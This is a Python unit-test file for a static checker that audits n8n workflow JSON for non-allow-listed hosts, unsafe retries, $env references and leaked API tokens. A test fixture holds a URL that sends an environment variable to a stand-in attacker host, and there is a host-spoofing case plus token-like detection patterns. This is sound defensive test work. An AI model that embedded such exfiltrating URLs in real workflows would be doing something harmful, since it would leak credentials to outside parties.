"""Tests for src/checks/static_checks.py.

Secret-like strings are assembled at runtime so this file does not match the guard's secret patterns.
"""
import contextlib
import io
import json
import os
import tempfile
import unittest

from src.checks.static_checks import ALLOWED_HOSTS, audit_workflow, check_file, main, scan_secrets, split_url


def http_node(name, url, method="GET", **extra):
    node = {
        "name": name,
        "type": "n8n-nodes-base.httpRequest",
        "onError": "continueErrorOutput",
        "parameters": {"method": method, "url": url, "options": {"timeout": 10000}},
    }
    node.update(extra)
    return node


def good_workflow():
    return {
        "name": "t4-test",
        "nodes": [
            {"name": "0. Config", "type": "n8n-nodes-base.set", "parameters": {}},
            http_node("H6 LLM Classify", "https://api.openai.com/v1/chat/completions", "POST",
                      retryOnFail=True, maxTries=2),
            http_node("H7 Ledger Append", "=__SINK_BASE_URL__/append/ledger", "POST"),
            http_node("H11 Jira Search", "=__JIRA_BASE_URL__/rest/api/3/search/jql?jql={{ $json.jql }}"),
            http_node("H12 Jira Create", "=__JIRA_BASE_URL__/rest/api/3/issue", "POST", retryOnFail=False),
            http_node("H14 Slack Notify", "=__SLACK_BASE_URL__/api/chat.postMessage", "POST"),
        ],
        "connections": {},
    }


BAD_WORKFLOW = ('{"nodes":[{"name":"Bad","type":"n8n-nodes-base.httpRequest","retryOnFail":true,"maxTries":9,'
                '"parameters":{"url":"=https://evil.example.invalid/{{$env.X}}","options":{}}}]}')


class AuditWorkflowTest(unittest.TestCase):
    def test_good_workflow_is_clean(self):
        nodes, violations, paths = audit_workflow(good_workflow())
        self.assertEqual(violations, [])
        self.assertEqual(len(nodes), 5)

    def test_reports_every_jira_and_slack_path(self):
        _, _, paths = audit_workflow(good_workflow())
        self.assertEqual(paths, [
            {"node": "H11 Jira Search", "target": "jira", "method": "GET", "path": "/rest/api/3/search/jql"},
            {"node": "H12 Jira Create", "target": "jira", "method": "POST", "path": "/rest/api/3/issue"},
            {"node": "H14 Slack Notify", "target": "slack", "method": "POST", "path": "/api/chat.postMessage"},
        ])

    def test_bad_workflow_has_every_violation(self):
        _, violations, _ = audit_workflow(json.loads(BAD_WORKFLOW))
        text = "\n".join(violations)
        for want in ("no onError", "maxTries", "options.timeout", "allowed host", "$env"):
            with self.subTest(want=want):
                self.assertIn(want, text)

    def test_jira_create_with_retry_fails(self):
        wf = good_workflow()
        wf["nodes"][4]["retryOnFail"] = True
        wf["nodes"][4]["maxTries"] = 2
        _, violations, _ = audit_workflow(wf)
        self.assertEqual(violations, ["H12 Jira Create: Jira create must have retryOnFail false"])

    def test_jira_search_may_retry(self):
        wf = good_workflow()
        wf["nodes"][3]["retryOnFail"] = True
        wf["nodes"][3]["maxTries"] = 2
        self.assertEqual(audit_workflow(wf)[1], [])

    def test_jira_node_create_with_retry_fails(self):
        wf = {"nodes": [{"name": "J", "type": "n8n-nodes-base.jira", "onError": "continueErrorOutput",
                         "retryOnFail": True, "maxTries": 2, "parameters": {"operation": "create"}}]}
        self.assertEqual(audit_workflow(wf)[1], ["J: Jira create must have retryOnFail false"])

    def test_env_in_code_node_fails(self):
        wf = good_workflow()
        wf["nodes"].append({"name": "H1 Intake Guard", "type": "n8n-nodes-base.code",
                            "parameters": {"jsCode": "return [{json: {t: $env.T4_WEBHOOK_TOKEN}}];"}})
        self.assertEqual(audit_workflow(wf)[1], ["H1 Intake Guard: references $env"])

    def test_env_outside_nodes_fails(self):
        wf = good_workflow()
        wf["settings"] = {"note": "{{ $env.X }}"}
        self.assertEqual(audit_workflow(wf)[1], ["workflow: references $env outside nodes"])

    def test_dynamic_url_fails(self):
        wf = {"nodes": [http_node("Dyn", "={{ $json.url }}")]}
        self.assertEqual(audit_workflow(wf)[1], ["Dyn: httpRequest URL is not under an allowed host"])

    def test_nodes_not_a_list(self):
        self.assertEqual(audit_workflow({"nodes": {}}), ([], ["workflow.nodes must be a list"], []))


class SplitUrlTest(unittest.TestCase):
    def test_allowed_prefixes_need_a_boundary(self):
        cases = (
            ("https://api.openai.com/v1/chat/completions", ("https://api.openai.com", "/v1/chat/completions")),
            ("https://api.openai.com.evil.example.invalid/v1", (None, None)),
            ("=__SINK_BASE_URL__/lookup/audit?content_sha256={{ $json.c }}", ("__SINK_BASE_URL__", "/lookup/audit")),
            ("=__SINK_BASE_URL__X/append", (None, None)),
            ("__SLACK_BASE_URL__", ("__SLACK_BASE_URL__", "/")),
            ("http://localhost:8790/append/audit", (None, None)),
            (None, (None, None)),
        )
        for url, want in cases:
            with self.subTest(url=url):
                self.assertEqual(split_url(url, ALLOWED_HOSTS), want)


class SecretScanTest(unittest.TestCase):
    def test_detects_without_values(self):
        key = "sk" + "-" + "A" * 24
        text = '{"a": 1}\n{"header": "' + key + '"}\n'
        findings = scan_secrets(text)
        self.assertEqual([f["line"] for f in findings], [2])
        self.assertNotIn(key, json.dumps(findings))

    def test_slack_and_bearer(self):
        lines = ["xox" + "b-" + "1" * 12, "Bear" + "er " + "z" * 24]
        self.assertEqual(sorted(f["line"] for f in scan_secrets("\n".join(lines))), [1, 2])

    def test_placeholder_is_clean(self):
        self.assertEqual(scan_secrets(json.dumps(good_workflow())), [])


class MainTest(unittest.TestCase):
    def _run(self, text, *flags):
        with tempfile.TemporaryDirectory() as tmp:
            src = os.path.join(tmp, "wf.json")
            out = os.path.join(tmp, "out.json")
            with open(src, "w", encoding="utf-8") as f:
                f.write(text)
            with contextlib.redirect_stdout(io.StringIO()):
                rc = main([src, "--out", out] + list(flags))
            with open(out, encoding="utf-8") as f:
                return rc, json.load(f)

    def test_strict_rejects_bad_workflow(self):
        rc, report = self._run(BAD_WORKFLOW, "--strict")
        self.assertEqual(rc, 1)
        self.assertTrue(report["violations"])

    def test_non_strict_reports_but_exits_zero(self):
        rc, report = self._run(BAD_WORKFLOW)
        self.assertEqual(rc, 0)
        self.assertTrue(report["violations"])

    def test_strict_accepts_good_workflow(self):
        rc, report = self._run(json.dumps(good_workflow()), "--strict")
        self.assertEqual(rc, 0)
        self.assertEqual(report["violations"], [])
        self.assertEqual(len(report["paths"]), 3)
        self.assertRegex(report["sha256"], r"^[0-9a-f]{64}$")

    def test_strict_rejects_secret(self):
        wf = good_workflow()
        wf["nodes"][0]["parameters"]["note"] = "sk" + "-" + "B" * 30
        rc, report = self._run(json.dumps(wf), "--strict")
        self.assertEqual(rc, 1)
        self.assertEqual(len(report["secrets"]), 1)

    def test_allowed_hosts_override(self):
        rc, report = self._run(json.dumps(good_workflow()), "--strict", "--allowed-hosts", "__SINK_BASE_URL__")
        self.assertEqual(rc, 1)
        self.assertEqual(len(report["violations"]), 4)

    def test_check_file_matches_main(self):
        with tempfile.TemporaryDirectory() as tmp:
            src = os.path.join(tmp, "wf.json")
            with open(src, "w", encoding="utf-8") as f:
                f.write(json.dumps(good_workflow()))
            self.assertEqual(check_file(src)["violations"], [])


if __name__ == "__main__":
    unittest.main()
